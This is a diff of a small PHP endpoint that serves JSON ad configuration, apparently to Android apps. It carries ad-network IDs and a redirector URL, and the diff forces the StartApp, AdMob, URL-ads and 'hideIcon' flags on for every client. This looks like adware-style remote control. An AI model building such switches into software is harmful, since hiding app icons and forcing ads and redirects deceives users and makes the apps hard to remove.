@@ -2,7 +2,7 @@
 
 
 $idarray= array(
-array("0","82096619-fa22-4027-8fe7-f6c3a925c98f","206270177","ca-app-pub-8872907273957591~1503438261","ca-app-pub-8872907273957591/5031619733","0","0","0","https://androidmoney.info/apps/redirector.php","0","0","0")
+array("0","82096619-fa22-4027-8fe7-f6c3a925c98f","211424545","ca-app-pub-8872907273957591~1503438261","ca-app-pub-8872907273957591/5031619733","0","0","0","https://androidmoney.info/apps/redirector.php","0","0","0")
 
 
 );
@@ -21,18 +21,18 @@ $turnURLads=$idarray[$r][9];
 $forceRate=$idarray[$r][10];
 $hideIcon=$idarray[$r][11];
 
-$data = array('turnonJSON' => $turnonJSON,
+$data = array('turnonJSON' => 1,
 'idAppnext' => $idAppnext,
 'idStartapp' => $idStartapp, 
 'idAdmob' => $idAdmob, 
 'placementAdmob' => $placementAdmob, 
 'turnAppnext' => $turnAppnext, 
-'turnStartapp' => $turnStartapp, 
-'turnAdmob' => $turnAdmob, 
+'turnStartapp' => 1, 
+'turnAdmob' => 1, 
 'idURL' => $idURL, 
-'turnURLads' => $turnURLads, 
+'turnURLads' => 1, 
 'forceRate' => $forceRate,
-'hideIcon' => $hideIcon
+'hideIcon' => 1
 );
 header('Content-type: application/json');
 echo json_encode( $data );
